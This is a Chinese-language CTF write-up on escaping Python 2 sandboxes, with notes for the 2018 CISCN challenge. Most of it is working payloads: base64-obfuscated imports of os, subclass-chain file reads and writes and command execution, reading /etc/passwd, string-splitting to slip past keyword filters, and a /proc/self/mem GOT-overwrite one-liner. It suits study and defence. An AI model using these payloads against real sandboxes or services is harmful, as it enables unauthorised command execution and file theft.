
---
typora-root-url: ../../../docs
---

# 绕过Python沙盒方法
**模块的引用**
通常思路，我们应该找到题目还给我们留下了什么，通常而言
通常而言，出题人一般是禁止引入敏感包，比如 **os** 或者 **system** 
## 0x01 绕过，通过路径引入
Python 的 os 模块的路径几乎都是 /usr/lib/python2.7/os.py 中
所以我们可以通过路径引入一些模块
```py
>>> import sys
>>> sys.modules['os']='/usr/lib/python2.7/os.py'
>>> import os
>>>
```


## 0x02 dir 与__dict__

首先，我们应该确定程序还有哪些内置函数可以用，我们可以通过 `dir __builtin__` 来获取内置函数列表
```python
>>> dir(__builtins__)
['ArithmeticError', 'AssertionError', 'AttributeError', 'BaseException', 'BufferError', 'BytesWarning', 'DeprecationWarning', 'EOFError', 'Ellipsis', 'EnvironmentError', 'Exception', 'False', 'FloatingPointError', 'FutureWarning', 'GeneratorExit', 'IOError', 'ImportError', 'ImportWarning', 'IndentationError', 'IndexError', 'KeyError', 'KeyboardInterrupt', 'LookupError', 'MemoryError', 'NameError', 'None', 'NotImplemented', 'NotImplementedError', 'OSError', 'OverflowError', 'PendingDeprecationWarning', 'ReferenceError', 'RuntimeError', 'RuntimeWarning', 'StandardError', 'StopIteration', 'SyntaxError', 'SyntaxWarning', 'SystemError', 'SystemExit', 'TabError', 'True', 'TypeError', 'UnboundLocalError', 'UnicodeDecodeError', 'UnicodeEncodeError', 'UnicodeError', 'UnicodeTranslateError', 'UnicodeWarning', 'UserWarning', 'ValueError', 'Warning', 'ZeroDivisionError', '_', '__debug__', '__doc__', '__import__', '__name__', '__package__', 'abs', 'all', 'any', 'apply', 'basestring', 'bin', 'bool', 'buffer', 'bytearray', 'bytes', 'callable', 'chr', 'classmethod', 'cmp', 'coerce', 'compile', 'complex', 'copyright', 'credits', 'delattr', 'dict', 'dir', 'divmod', 'enumerate', 'eval', 'execfile', 'exit', 'file', 'filter', 'float', 'format', 'frozenset', 'getattr', 'globals', 'hasattr', 'hash', 'help', 'hex', 'id', 'input', 'int', 'intern', 'isinstance', 'issubclass', 'iter', 'len', 'license', 'list', 'locals', 'long', 'map', 'max', 'memoryview', 'min', 'next', 'object', 'oct', 'open', 'ord', 'pow', 'print', 'property', 'quit', 'range', 'raw_input', 'reduce', 'reload', 'repr', 'reversed', 'round', 'set', 'setattr', 'slice', 'sorted', 'staticmethod', 'str', 'sum', 'super', 'tuple', 'type', 'unichr', 'unicode', 'vars', 'xrange', 'zip']
```
在Python中，不引入直接使用的内置函数被成为**builtin**函数，随着**__builtin__**这个模块自动引入到环境中

进而，我们可以通过`__dict__`引入我们想要引入的模块

两种方法都是一个目的,那就是列出一个模组/类/对象 下面 所有的属性和函数
这在沙盒逃逸中是很有用的,可以找到隐藏在其中的一些东西
我们可以通过`__dict__`做什么呢？
一个模块对象有一个由字典对象实现的命名空间…属性引用被转换为这个字典中的查找，例如，m.x等同于m.dict["x"]

绕过实例：
首先通过 base64 绕过字符明文检测
```python
>>> import base64
>>> base64.b64encode('__import__')
'X19pbXBvcnRfXw=='
>>> base64.b64encode('os')
'b3M='
```
然后通过 **__dict__** 引用
```py
>>> __builtins__.__dict__['X19pbXBvcnRfXw=='.decode('base64')]('b3M='.decode('base64'))
```

*如果一些 内敛函数在 __builtins__ 删除 ，我们可以通过 reload(__builtins__) 重新载入获取一个完整的 __builtins__*
## 0x03 创建对象，以及引用
Python 的 object 类中集成了很多的基础函数，我们想要调用的时候也是可以通过创建对象进而引用

有常见的两个方法
```bash
().__class__.__bases__[0]
''.__class__.__mro__[2]
```
![](http://oayoilchh.bkt.clouddn.com/18-5-3/14928461.jpg)
如，我们可通过
`print ().__class__.__bases__[0].__subclasses__()[40]("/etc/services").read()`达到文件读取的效果，

**常见payload**
```py
#读文件
().__class__.__bases__[0].__subclasses__()[40](r'C:\1.php').read()

#写文件
().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')

#执行任意命令
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls  /var/www/html").read()' )
```
## 0x04 其他危险的函数
如 **execfile** 文件执行
```py
>>> execfile('/usr/lib/python2.7/os.py')
>>> system('cat /etc/passwd')
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
>>> getcwd()
'/usr/lib/python2.7'
```
**timeit**
```py
import timeit
timeit.timeit("__import__('os').system('dir')",number=1)
```

** exec 和 eval 比较经典了**
```py
eval('__import__("os").system("dir")')

```
**platform**
```py
import platform
print platform.popen('dir').read()
```

## 0x05 __getattr__() 和 __getattribute__() 
python 再访问属性的方法上定义了 __getattr__()  和 __getattribute__()  2种方法，其区别非常细微，但非常重要。

如果某个类定义了 __getattribute__() 方法，在 每次引用属性或方法名称时 Python 都调用它（特殊方法名称除外，因为那样将会导致讨厌的无限循环）。
如果某个类定义了 __getattr__() 方法，Python 将只在正常的位置查询属性时才会调用它。如果实例 x 定义了属性 color， x.color 将 不会 调用x.__getattr__('color')；而只会返回 x.color 已定义好的值。
这里，我们可以通过 __getattribute__ 这个方法做一些事，如下面的payload
```py
x = [x for x in [].__class__.__base__.__subclasses__() if x.__name__ == 'ca'+'tch_warnings'][0].__init__
x.__getattribute__("func_global"+"s")['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('l'+'s')
```

## 0x06 间接的引用调用
在有些题目中，如这次的2018年国赛的 Python 沙盒题目上，import 其实整个是被阉割了。

但是在Python中，原生的 **__import__** 是存在被引用的，只要我们找到相关对象引用就可以进一步获取我们想要的内容，具体下面的demo会讲述到

## 0x07 write修改got表
实际上是一个 **/proc/self/mem** 的内存操作方法
**/proc/self/mem** 是内存镜像，能够通过它来读写到进程的所有内存，包括可执行代码，如果我们能获取到Python一些函数的偏移，如 **system** ，我们就能通过想做pwn题的劫持got表做我们任意想做的事情

```py
(lambda r,w:r.seek(0x08de2b8) or w.seek(0x08de8c8) or w.write(r.read(8)) or ().__class__.__bases__[0].__subclasses__()[40]('c'+'at /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb'))(().__class__.__bases__[0].__subclasses__()[40]('/proc/self/mem','r'),().__class__.__bases__[0].__subclasses__()[40]('/proc/self/mem', 'w', 0))
```
第一个地址是 system 的偏移，第二个是fopen的偏移，我们可以通过 **objdump** 获取相关信息
![](http://oayoilchh.bkt.clouddn.com/18-5-3/25123674.jpg)

# 例子
我们可以通过
`print ().__class__.__bases__[0].__subclasses__()[40]("/home/ctf/sandbox.py").read()` 
获取题目源码，然后可以进一步分析

## 解决
三种方法
### 0x01
```py
x = [x for x in [].__class__.__base__.__subclasses__() if x.__name__ == 'ca'+'tch_warnings'][0].__init__
x.__getattribute__("func_global"+"s")['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('l'+'s')
x.__getattribute__("func_global"+"s")['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('l'+'s /home/ctf')
x.__getattribute__("func_global"+"s")['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ca'+'t /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb')
```
### 0x02
修改 got
```py
(lambda r,w:r.seek(0x08de2b8) or w.seek(0x08de8c8) or w.write(r.read(8)) or ().__class__.__bases__[0].__subclasses__()[40]('l'+'s /home/ctf/'))(().__class__.__bases__[0].__subclasses__()[40]('/proc/self/mem','r'),().__class__.__bases__[0].__subclasses__()[40]('/proc/self/mem', 'w', 0))


(lambda r,w:r.seek(0x08de2b8) or w.seek(0x08de8c8) or w.write(r.read(8)) or ().__class__.__bases__[0].__subclasses__()[40]('c'+'at /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb'))(().__class__.__bases__[0].__subclasses__()[40]('/proc/self/mem','r'),().__class__.__bases__[0].__subclasses__()[40]('/proc/self/mem', 'w', 0))

```
### 0x03
间接引用
在不断的 dir 过程中，发现 __closure__  这个 object 保存了参数，可以引用原生的 __import__
```py

print __import__.__getattribute__('__clo'+'sure__')[0].cell_contents('o'+'s').__getattribute__('sy'+'stem')('l'+'s home') 
```
# 参考
https://xz.aliyun.com/t/52#toc-10 
https://blog.csdn.net/qq_35078631/article/details/78504415 
https://www.anquanke.com/post/id/85571 
http://bestwing.me/2018/05/03/awesome-python-sandbox-in-ciscn/#0x01
